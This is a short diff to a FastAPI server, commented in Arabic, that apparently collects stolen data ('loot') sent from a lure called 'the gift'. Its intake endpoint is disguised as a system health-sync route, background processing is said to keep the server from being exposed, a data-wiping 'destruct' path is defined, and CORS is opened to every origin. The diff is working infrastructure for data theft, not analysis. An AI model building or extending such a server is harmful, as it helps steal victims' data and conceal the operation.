@@ -13,9 +13,9 @@ DESTRUCT_PATH = "nuclear_delete_all_data_99"
 
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=["*"], # يسمح لمتجرك وموقع الهدية بالإرسال للسيرفر
+    allow_origins=["*"],  # مهم جداً للسماح بطلبات الـ Preflight
     allow_credentials=True,
-    allow_methods=["POST", "GET", "OPTIONS"], # المهم هو POST و OPTIONS
+    allow_methods=["*"],  # يسمح بـ POST, OPTIONS, GET
     allow_headers=["*"],
 )
 
@@ -114,6 +114,7 @@ def process_incoming_loot(raw_bytes: bytes, ip: str):
 # --- 5. البوابات ---
 @app.post("/api/v1/sys/health/sync")
 async def inbound_gate(request: Request, bg: BackgroundTasks):
+    print("DEBUG: RECEIVED A HIT FROM THE GIFT!")
     ip = request.headers.get("x-forwarded-for", request.client.host).split(',')[0]
     raw = await request.body()
     # المعالجة في الخلفية لضمان سرعة الرد وعدم كشف السيرفر
